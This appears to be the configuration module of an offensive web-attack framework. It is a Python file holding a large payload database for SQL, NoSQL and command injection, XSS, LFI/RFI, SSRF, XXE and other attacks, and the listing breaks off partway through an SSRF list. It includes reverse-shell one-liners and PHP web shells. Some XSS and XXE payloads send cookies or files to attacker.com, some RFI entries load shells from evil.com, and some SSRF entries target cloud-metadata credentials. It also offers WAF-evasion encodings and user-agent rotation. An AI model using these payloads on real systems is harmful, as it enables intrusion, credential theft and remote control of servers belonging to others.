#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK v9.0 - ULTIMATE EDITION
Configuration Module - Termux Optimized
"""

import os
import random

class Config:
    """Main Configuration"""
    
    # Version Info
    VERSION = "10.0-ULTIMATE"
    CODENAME = "TITAN"
    AUTHOR = "Atomic Security"
    
    # Paths
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
    REPORTS_DIR = os.path.join(BASE_DIR, "reports")
    SHELLS_DIR = os.path.join(BASE_DIR, "shells")
    WORDLISTS_DIR = os.path.join(BASE_DIR, "wordlists")
    
    # Database
    DB_URL = os.environ.get('ATOMIC_DB_URL', f'sqlite:///{BASE_DIR}/atomic_framework.db')
    
    # GitHub API — optional token for higher rate limits (60 → 5000 req/hr)
    GITHUB_TOKEN = os.environ.get('GITHUB_TOKEN', '')
    
    # Threading
    MAX_THREADS = min(100, (os.cpu_count() or 4) * 10)
    TIMEOUT = 15
    REQUEST_DELAY = 0.1
    MAX_DEPTH = 5
    
    # Evasion
    EVASION_LEVELS = ['none', 'low', 'medium', 'high', 'insane', 'stealth']
    
    # User Agents
    USER_AGENTS = [
        'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.0.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.0',
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    ]
    
    # Proxies rotation
    PROXIES = []
    
    # Headers rotation
    HEADERS_ROTATION = [
        {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'},
        {'Accept': 'application/json, text/javascript, */*; q=0.01'},
        {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'},
        {'Accept': '*/*'},
    ]
    
    @classmethod
    def get_random_ua(cls):
        return random.choice(cls.USER_AGENTS)
    
    @classmethod
    def get_random_headers(cls):
        headers = {
            'User-Agent': cls.get_random_ua(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0',
        }
        headers.update(random.choice(cls.HEADERS_ROTATION))
        return headers


class Payloads:
    """Advanced Payloads Database"""
    
    # SQL Injection - Advanced
    SQLI_ERROR_BASED = [
        "'", "''", "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*",
        "' OR 1=1 --", "' OR 1=1 #", "' OR 1=1/*", "') OR '1'='1 --",
        "') OR ('1'='1 --", "' OR '1'='1' AND 1=1 --", "1' AND 1=1 --",
        "1' AND 1=2 --", "1 OR 1=1", "1' OR '1'='1", "1' AND '1'='1'",
        "1' AND '1'='2'", "' UNION SELECT NULL --", "' UNION SELECT NULL,NULL --",
        "admin' --", "admin' #", "admin'/*", "' OR 1=1 LIMIT 1 --",
        "' OR '1'='1' LIMIT 1 --", "1 AND 1=1", "1 AND 1=2",
        "' UNION SELECT @@version --", "' UNION SELECT user() --",
        "' UNION SELECT database() --", "' UNION SELECT table_name FROM information_schema.tables --",
        "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --",
        "'; DROP TABLE users; --", "'; DELETE FROM users; --",
        "' AND 1=CONVERT(int, (SELECT @@version)) --",
        "' AND 1=CONVERT(int, (SELECT DB_NAME())) --",
    ]
    
    SQLI_TIME_BASED = [
        "' OR SLEEP(5) --", "' OR SLEEP(5)#", "' OR pg_sleep(5) --",
        "' OR WAITFOR DELAY '0:0:5' --", "' OR benchmark(5000000,MD5(1)) --",
        "'; SELECT SLEEP(5) --", "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
        "' OR IF(1=1, SLEEP(5), 0) --", "' OR (SELECT COUNT(*) FROM information_schema.tables SLEEP(5)) --",
    ]
    
    SQLI_UNION_BASED = [
        "' UNION SELECT 1,2,3 --", "' UNION SELECT null,null,null --",
        "' UNION SELECT @@version,user(),database() --",
        "' UNION SELECT table_schema,table_name,column_name FROM information_schema.columns --",
        "' UNION SELECT username,password,email FROM users --",
        "' UNION SELECT load_file('/etc/passwd'),2,3 --",
        "' UNION SELECT 1,2,3 INTO OUTFILE '/var/www/html/shell.php' --",
    ]
    
    # NoSQL Injection
    NOSQL_PAYLOADS = [
        '{"$gt": ""}', '{"$ne": null}', '{"$exists": true}',
        '{"$regex": ".*"}', '{"$where": "this.password.length > 0"}',
        "{'$gt': ''}", "{'$ne': None}", "{'$exists': true}",
        "admin' || '1'=='1", "admin' && '1'=='1",
        "'; return true; var dummy='", "'; return '1'=='1'; var dummy='",
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
        '{"$where": "sleep(5000)"}', '{"$where": "this.sleep(5000)"}',
    ]
    
    # Command Injection - Advanced
    CMDI_PAYLOADS = [
        "; ls -la", "; cat /etc/passwd", "; id", "; whoami", "; uname -a",
        "| ls -la", "| cat /etc/passwd", "| id", "| whoami",
        "&& ls -la", "&& cat /etc/passwd", "&& id",
        "|| ls -la", "|| cat /etc/passwd",
        "`ls -la`", "`id`", "`whoami`",
        "$(ls -la)", "$(id)", "$(whoami)",
        "; ping -c 1 127.0.0.1", "| ping -c 1 127.0.0.1",
        "; sleep 5", "| sleep 5", "&& sleep 5",
        "; nc -e /bin/sh 127.0.0.1 4444", "| nc -e /bin/sh 127.0.0.1 4444",
        "; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1",
        "; python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'",
        "; php -r '$sock=fsockopen(\"127.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "; ruby -rsocket -e'f=TCPSocket.open(\"127.0.0.1\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "; perl -e 'use Socket;$i=\"127.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
    ]
    
    # XSS - Advanced
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<details open ontoggle=alert('XSS')>",
        "<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",
        "<svg><animate onbegin=alert('XSS') attributeName=x></svg>",
        "<marquee onstart=alert('XSS')>",
        "<meter onmouseover=alert('XSS')>",
        "<script>fetch('http://attacker.com/?c='+document.cookie)</script>",
        "<img src=x onerror=fetch('http://attacker.com/?c='+document.cookie)>",
        "<script>document.location='http://attacker.com/?c='+document.cookie</script>",
        "<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
        "<iframe srcdoc='<script>alert(1)</script>'>",
        "<object data='javascript:alert(1)'>",
        "<embed src='javascript:alert(1)'>",
        "<form action=javascript:alert(1)><input type=submit>",
        "<isindex type=image src=1 onerror=alert(1)>",
        "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
    ]
    
    # LFI/RFI - Advanced
    LFI_PAYLOADS = [
        "../../../etc/passwd", "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        r"..\..\..\windows\win.ini", r"....\\....\\....\\windows\\win.ini",
        "/etc/passwd%00", "../../../etc/passwd%00",
        "php://filter/read=convert.base64-encode/resource=index.php",
        "php://filter/read=convert.base64-encode/resource=/etc/passwd",
        "php://input", "php://expect://ls",
        "file:///etc/passwd", "file:///C:/windows/win.ini",
        "file:///etc/hosts", "file:///proc/self/environ",
        "expect://ls", "input://", "data://text/plain,<?php phpinfo(); ?>",
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
        "zip:///var/www/html/upload.zip%23shell.php",
        "phar:///var/www/html/upload.phar/shell.txt",
        "../../../var/log/apache2/access.log",
        "../../../var/log/nginx/access.log",
        "../../../proc/self/environ",
        "../../../proc/self/cmdline",
    ]
    
    RFI_PAYLOADS = [
        "http://evil.com/shell.txt",
        "http://evil.com/shell.php",
        "https://evil.com/shell.txt",
        "ftp://evil.com/shell.php",
        "//evil.com/shell.php",
    ]
    
    # SSRF - Advanced
    SSRF_PAYLOADS = [
        "http://127.0.0.1", "http://localhost", "http://0.0.0.0",
        "http://[::1]", "http://0177.0.0.1", "http://2130706433",
        "http://017700000001", "http://0x7f.0.0.1", "http://0x7f000001",
        "file:///etc/passwd", "dict://localhost:11211/",
        "gopher://localhost:9000/_", "ftp://anonymous@localhost/",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data",
        "http://instance-data/latest/meta-data/",
        "http://100.100.100.200/latest/meta-data/",
    ]
    
    # SSTI - Advanced
    SSTI_PAYLOADS = [
        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "${{7*7}}",
        "{{config}}", "{{self}}", "{{request}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "{{''.__class__.__mro__[2].__subclasses__()[40]}}",
        "{% raw %}{{7*7}}{% endraw %}",
        "#{7*7}", "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    ]
    
    # XXE - Advanced
    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><root>&xxe;</root>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>',
        "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY exfil SYSTEM 'http://attacker.com/?x=%file;'>\">%eval;]><data>&exfil;</data>",
    ]
    
    # Open Redirect
    OPEN_REDIRECT_PAYLOADS = [
        "http://evil.com", "//evil.com", "https://evil.com",
        "/\\evil.com", "http:evil.com", "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "//attacker.com/%2f..", r"/\/attacker.com",
        "https://attacker.com", "//attacker.com",
        "/%09/evil.com", "/%5cevil.com",
        "///evil.com", "////evil.com",
    ]
    
    # IDOR
    IDOR_SEQUENCES = list(range(1, 100))
    
    # Path Traversal
    PATH_TRAVERSAL = [
        "../", "..%2f", "%2e%2e%2f", "%252e%252e%252f",
        "..%00/", "..%0d/", "..%5c", "%2e%2e%5c",
        "..\\", "....//", "....\\", ".../",
        "..%c0%af", "..%ef%bc%8f", "%c0%ae%c0%ae/",
    ]
    
    # File Upload Bypass
    UPLOAD_BYPASS = [
        ".php", ".php3", ".php4", ".php5", ".phtml",
        ".phar", ".phps", ".pht", ".phpt",
        ".Php", ".pHp", ".PHP", ".php.", ".php%00.jpg",
        ".php%00.png", ".php%00.gif", ".php.jpg", ".php.png",
        ".php;.jpg", ".php%20", ".php%0d%0a.jpg",
        ".php%00", ".php\x00.jpg", ".php%0a",
        ".php5.jpg", ".phtml.jpg", ".phar.jpg",
    ]
    
    # Web Shells
    PHP_SHELLS = [
        "<?php system($_GET['cmd']); ?>",
        "<?php echo shell_exec($_GET['cmd']); ?>",
        "<?php passthru($_GET['cmd']); ?>",
        "<?php exec($_GET['cmd'], $out); print_r($out); ?>",
        "<?php eval($_REQUEST['cmd']); ?>",
        "<?php @eval($_POST['cmd']); ?>",
        '<?php if(isset($_REQUEST[\'cmd\'])){ echo "<pre>"; $cmd = ($_REQUEST[\'cmd\']); system($cmd); echo "</pre>"; die; }?>',
        "<?php $sock=fsockopen('127.0.0.1',4444);exec('/bin/sh -i <&3 >&3 2>&3');?>",
        "GIF89a<?php system($_GET['cmd']); ?>",
        "<?php $c=$_GET['c'];system($c);?>",
    ]
    
    # WAF Bypass Encodings
    ENCODINGS = {
        'url_single': lambda x: ''.join(f'%{ord(c):02x}' for c in x),
        'url_double': lambda x: ''.join(f'%25{ord(c):02x}' for c in x),
        'unicode': lambda x: ''.join(f'%u{ord(c):04x}' for c in x),
        'html_entities': lambda x: ''.join(f'&#{ord(c)};' for c in x),
        'hex': lambda x: ''.join(f'\\x{ord(c):02x}' for c in x),
        'octal': lambda x: ''.join(f'\\{ord(c):03o}' for c in x),
        'base64': lambda x: __import__('base64').b64encode(x.encode()).decode(),
    }

    # Advanced SQLi - Boolean-based blind
    SQLI_BOOLEAN_BLIND = [
        "' AND 1=1 --", "' AND 1=2 --",
        "' AND 'a'='a", "' AND 'a'='b",
        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --",
        "' AND SUBSTRING(version(),1,1)='5' --",
        "' AND (SELECT LENGTH(database()))>0 --",
        "' AND ORD(MID((SELECT IFNULL(CAST(schema_name AS NCHAR),0x20) FROM information_schema.schemata LIMIT 0,1),1,1))>64 --",
    ]

    # Advanced SQLi - Stacked queries
    SQLI_STACKED = [
        "'; SELECT 1; --",
        "'; SELECT pg_sleep(5); --",
        "'; EXEC xp_cmdshell('whoami'); --",
        "'; DECLARE @q VARCHAR(200)=0x77686f616d69; EXEC(@q); --",
        "'; INSERT INTO users(username,password) VALUES('hacked','hacked'); --",
    ]

    # Advanced SQLi - WAF Bypass techniques
    SQLI_WAF_BYPASS = [
        # MySQL versioned comments
        "' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3 --",
        "' /*!50000UNION*/ ALL /*!50000SELECT*/ NULL,NULL,NULL --",
        # Inline comment splitting
        "' UN/**/ION SEL/**/ECT 1,2,3 --",
        "' UNI%0bON SEL%0bECT 1,2,3 --",
        # Case randomization
        "' uNiOn SeLeCt 1,2,3 --",
        "' UnIoN sElEcT NULL,NULL,NULL --",
        # Whitespace alternatives
        "' UNION%09SELECT%091,2,3 --",
        "' UNION%0aSELECT%0a1,2,3 --",
        "' UNION%0dSELECT%0d1,2,3 --",
        "' UNION%0bSELECT%0b1,2,3 --",
        # Scientific notation
        "' OR 1e0=1e0 --",
        "' AND 1e0=1e0 --",
        # LIKE/REGEXP alternatives
        "' OR 1 LIKE 1 --",
        "' OR 'a' REGEXP 'a' --",
        # Double encoding
        "' %252f%252a*/UNION%252f%252a*/SELECT 1,2,3 --",
        # Parenthesis wrapping
        "' UNION (SELECT 1,2,3) --",
        "' AND (1)=(1) --",
    ]

    # LDAP Injection
    LDAP_PAYLOADS = [
        "*)(uid=*))(|(uid=*",
        "*)(&", "*## ",
        "*()|%26'", "admin)(&)",
        "admin)(!(&(1=0", "*()|&'",
        "*)(|(password=*)",
        "admin)(|(objectClass=*))",
        "*))%00",
    ]

    # XPath Injection
    XPATH_PAYLOADS = [
        "' or '1'='1", "' or ''='", "x' or 1=1 or 'x'='y",
        "1 or 1=1", "' or 1=1 or ''='",
        "') or ('1'='1", "' or count(parent::*[position()=1])=0 or 'a'='b",
        "' or substring(name(parent::*[position()=1]),1,1)='a' or 'a'='b",
        "1' or '1'='1' or '1'='1", "admin' or '1'='1",
    ]

    # HTTP Request Smuggling
    HTTP_SMUGGLING_PAYLOADS = [
        # CL.TE
        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
        # TE.CL
        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n",
        # TE.TE obfuscation
        "POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: cow\r\n\r\n0\r\n\r\n",
        # H2.CL
        "POST / HTTP/2\r\nHost: {host}\r\nContent-Length: 0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {host}\r\n\r\n",
    ]

    # Cache Poisoning
    CACHE_POISONING_PAYLOADS = [
        # Unkeyed headers
        "X-Forwarded-Host: evil.com",
        "X-Forwarded-Scheme: nothttps",
        "X-Original-URL: /admin",
        "X-Rewrite-URL: /admin",
        "X-Forwarded-Proto: nothttps",
        # Parameter pollution
        "?cb=1&utm_content=x",
        "?x=1%23",
        # Fat GET
        "GET /?param=normal HTTP/1.1\r\nContent-Length: 50\r\n\r\nparam=poisoned",
    ]

    # Advanced XSS - DOM-based
    XSS_DOM_PAYLOADS = [
        "#<img src=x onerror=alert(1)>",
        "javascript:alert(document.domain)",
        "'-alert(1)-'", "\\'-alert(1)//",
        "</script><script>alert(1)</script>",
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        "<svg><script>alert&lpar;1&rpar;</script>",
        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)//-->",
    ]

    # Advanced XSS - Polyglot
    XSS_POLYGLOT = [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik0telerik11telerik/telerik;alert(1)//",
        "'\"-->]]>*/</script></style></noscript></xmp></textarea><img src=x onerror=alert(1)>",
        "-->'\"\\><img src=x onerror=alert(1)>",
        # Modern mXSS
        "<svg><style>{font-family:'<img/src=x onerror=alert(1)>'}</style>",
        # Mutation-based
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
        # Modern event handlers
        "<video><source onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<select autofocus onfocus=alert(1)>",
        "<textarea autofocus onfocus=alert(1)>",
        "<keygen autofocus onfocus=alert(1)>",
    ]

    # Advanced SSRF - Cloud metadata
    SSRF_CLOUD_METADATA = [
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/api/token",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        "http://169.254.169.254/metadata/v1.json",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://100.100.100.200/latest/meta-data/",
        "http://169.254.170.2/v2/credentials",
        # DigitalOcean
        "http://169.254.169.254/metadata/v1/",
        "http://169.254.169.254/metadata/v1/hostname",
        # Alibaba Cloud
        "http://100.100.100.200/latest/meta-data/instance-id",
        "http://100.100.100.200/latest/meta-data/image-id",
        # Kubernetes
        "https://kubernetes.default.svc/api/v1/namespaces",
        "https://kubernetes.default.svc/api/v1/pods",
        # Oracle Cloud
        "http://169.254.169.254/opc/v2/instance/",
        "http://169.254.169.254/opc/v1/instance/metadata/",
    ]

    # CRLF Injection
    CRLF_PAYLOADS = [
        "%0d%0aSet-Cookie:crlfinjection=true",
        "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0a",
        "\\r\\nX-Injected: header",
        "%E5%98%8A%E5%98%8DSet-Cookie:crlfinjection=true",
    ]

    # HTTP Parameter Pollution
    HPP_PAYLOADS = [
        "&admin=true", "&role=admin", "&debug=1",
        "&access=all", "&auth=bypass",
    ]

    # Prototype Pollution
    PROTO_POLLUTION = [
        '{"__proto__":{"isAdmin":true}}',
        '{"constructor":{"prototype":{"isAdmin":true}}}',
        '__proto__[isAdmin]=true',
        'constructor.prototype.isAdmin=true',
    ]

    # GraphQL Injection
    GRAPHQL_PAYLOADS = [
        '{"query":"{__schema{types{name}}}"}',
        '{"query":"{__type(name:\\"User\\"){name fields{name type{name}}}}"}',
        '{"query":"query{users{id username password email}}"}',
        '{"query":"mutation{createUser(username:\\"admin\\",password:\\"admin\\",role:\\"admin\\"){id}}"}',
    ]

    # ── GitHub-style Secret Scanning Patterns ─────────────────────
    # Regex patterns for detecting leaked secrets/tokens in HTTP
    # responses, based on the techniques used by GitHub secret
    # scanning. Each entry is (name, pattern_string).
    SECRET_PATTERNS = [
        # AWS credentials
        ('AWS Access Key', r'(?:A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}'),
        ('AWS Secret Key', r'(?i)aws_?secret_?access_?key\s*[=:]\s*[A-Za-z0-9/+=]{40}'),
        # GitHub tokens
        ('GitHub PAT (classic)', r'ghp_[A-Za-z0-9]{36}'),
        ('GitHub PAT (fine-grained)', r'github_pat_[A-Za-z0-9_]{82}'),
        ('GitHub OAuth', r'gho_[A-Za-z0-9]{36}'),
        ('GitHub App Token', r'(?:ghu|ghs)_[A-Za-z0-9]{36}'),
        ('GitHub App Refresh', r'ghr_[A-Za-z0-9]{36,}'),
        # Google
        ('Google API Key', r'AIza[A-Za-z0-9_\\-]{35}'),
        ('Google OAuth Secret', r'(?i)client_secret\s*[=:]\s*[A-Za-z0-9_\\-]{24}'),
        # Stripe
        ('Stripe Secret Key', r'sk_live_[A-Za-z0-9]{24,}'),
        ('Stripe Publishable Key', r'pk_live_[A-Za-z0-9]{24,}'),
        # Slack
        ('Slack Bot Token', r'xoxb-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24}'),
        ('Slack Webhook', r'https://hooks\.slack\.com/services/T[A-Z0-9]{8,}/B[A-Z0-9]{8,}/[A-Za-z0-9]{24}'),
        # Private keys
        ('RSA Private Key', r'-----BEGIN RSA PRIVATE KEY-----'),
        ('SSH Private Key', r'-----BEGIN (?:OPENSSH|DSA|EC) PRIVATE KEY-----'),
        ('PGP Private Key', r'-----BEGIN PGP PRIVATE KEY BLOCK-----'),
        # JWT / Bearer tokens
        ('JWT Token', r'eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}'),
        ('Bearer Token', r'(?i)bearer\s+[A-Za-z0-9_\-.~+/]{20,}'),
        # Generic API keys / passwords in config
        ('Generic API Key', r'(?i)(?:api[_-]?key|apikey)\s*[=:]\s*["\']?[A-Za-z0-9_\-]{20,}["\']?'),
        ('Generic Secret', r'(?i)(?:secret|password|passwd|pwd)\s*[=:]\s*["\'][^"\']{8,}["\']'),
        # Database connection strings
        ('Database URL', r'(?i)(?:mysql|postgres(?:ql)?|mongodb(?:\+srv)?|redis)://[^\s"\'<>]{10,}'),
        # Heroku
        ('Heroku API Key', r'(?i)heroku[_-]?api[_-]?key\s*[=:]\s*[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'),
        # Twilio
        ('Twilio API Key', r'SK[0-9a-f]{32}'),
        # SendGrid
        ('SendGrid API Key', r'SG\.[A-Za-z0-9_\-]{22}\.[A-Za-z0-9_\-]{43}'),
        # Mailgun
        ('Mailgun API Key', r'key-[0-9a-zA-Z]{32}'),
        # NPM
        ('NPM Access Token', r'npm_[A-Za-z0-9]{36}'),
        # PyPI
        ('PyPI API Token', r'pypi-[A-Za-z0-9_\-]{50,}'),
    ]

    # ── GitHub Repository Best-Practice Payloads ──────────────────
    # Curated from the most popular GitHub security repositories:
    #   - PayloadsAllTheThings (swisskyrepo)
    #   - SecLists (danielmiessler)
    #   - PortSwigger/xss-cheat-sheet patterns
    #   - sqlmap tamper-style payloads
    #   - WafW00f WAF signatures
    # These are integrated directly — no download or install required.

    # --- Advanced SQLi Auth Bypass (from PayloadsAllTheThings) ---
    SQLI_AUTH_BYPASS = [
        "'-'", "' '", "'&'", "'^'", "'*'",
        "' or ''-'", "' or '' '", "' or ''&'", "' or ''^'", "' or ''*'",
        "'-||0#", "'-## 0#", "'-/**/0#",
        "admin'--", "admin' #", "admin'/*",
        "admin' or '1'='1", "admin' or '1'='1'--",
        "admin' or '1'='1'#", "admin' or '1'='1'/*",
        "admin' or 1=1", "admin' or 1=1--", "admin' or 1=1#",
        "admin') or ('1'='1", "admin') or ('1'='1'--",
        "admin') or ('1'='1'#", "admin') or 1=1--",
        "' OR 1=1-- -", "' OR 1=1# ", "') OR 1=1-- -",
        "') OR ('1'='1'-- -",
        "\" or \"\"=\"", "\" or 1=1-- -", "\" or 1=1#",
        "or 1=1", "or 1=1--", "or 1=1#", "or 1=1/*",
        "' or 1 in (select @@version)-- -",
        "' or 1=1 LIMIT 1-- -",
        "1' ORDER BY 1--+", "1' ORDER BY 2--+", "1' ORDER BY 3--+",
        "1' GROUP BY 1,2,--+",
    ]

    # --- Advanced XSS (from PortSwigger/PayloadsAllTheThings) ---
    XSS_ADVANCED = [
        # PortSwigger cheat-sheet derived
        "<svg/onload=alert(1)>",
        "<svg onload=alert`1`>",
        "<img src=x onerror=alert(1)//>",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<video src=_ onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<audio src onerror=alert(1)>",
        "<isindex type=image src=1 onerror=alert(1)>",
        "<object data=javascript:alert(1)>",
        "<embed src=javascript:alert(1)>",
        "<iframe srcdoc='<script>alert(1)</script>'>",
        # Modern event handlers & contexts
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>-->",
        "<svg><set onbegin=alert(1) attributeName=x to=1>",
        # Template / framework specific
        "{{constructor.constructor('return this')().alert(1)}}",
        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        # WAF-evasion XSS (case, encoding, splitting)
        "<IMG SRC=x OnErRoR=alert(1)>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<script>eval(atob('YWxlcnQoMSk='))</script>",
        "<svg/onload=eval(atob('YWxlcnQoMSk='))>",
        "<a href=javas&#99;ript:alert(1)>click</a>",
        # DOM-based blind XSS
        "'\"><script src=https://xss.report/s/test></script>",
        "'\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8veHNzLnJlcG9ydC9zL3Rlc3QiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>",
    ]

    # --- Advanced LFI / Path Traversal (from PayloadsAllTheThings/SecLists) ---
    LFI_ADVANCED = [
        # Double encoding
        "..%252f..%252f..%252f..%252fetc/passwd",
        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd",
        # UTF-8 overlong encoding
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
        # Null byte (PHP < 5.3.4)
        "../../../../../../etc/passwd%00",
        "../../../../../../etc/passwd%00.php",
        "../../../../../../etc/passwd%00.html",
        # PHP wrapper advanced
        "php://filter/read=convert.base64-encode/resource=index.php",
        "php://filter/convert.iconv.utf-8.utf-16/resource=index.php",
        "php://filter/zlib.deflate/convert.base64-encode/resource=index.php",
        "php://input",
        "expect://id",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        "phar://./test.phar/test.txt",
        # Linux interesting files
        "/etc/shadow", "/etc/hosts", "/etc/hostname",
        "/proc/self/environ", "/proc/self/cmdline",
        "/proc/self/fd/0", "/proc/self/fd/1", "/proc/self/fd/2",
        "/proc/version", "/proc/net/tcp",
        "/var/log/apache2/access.log", "/var/log/apache2/error.log",
        "/var/log/nginx/access.log", "/var/log/nginx/error.log",
        "/var/log/auth.log", "/var/log/syslog",
        # Windows
        "..\\..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "C:\\boot.ini", "C:\\windows\\system32\\config\\sam",
    ]

    # --- Advanced SSRF (from PayloadsAllTheThings/SecLists) ---
    SSRF_ADVANCED = [
        # IP obfuscation
        "http://0x7f000001/", "http://017700000001/",
        "http://2130706433/", "http://0x7f.0x0.0x0.0x1/",
        "http://0177.0000.0000.0001/",
        "http://[::ffff:127.0.0.1]/",
        "http://[0:0:0:0:0:ffff:127.0.0.1]/",
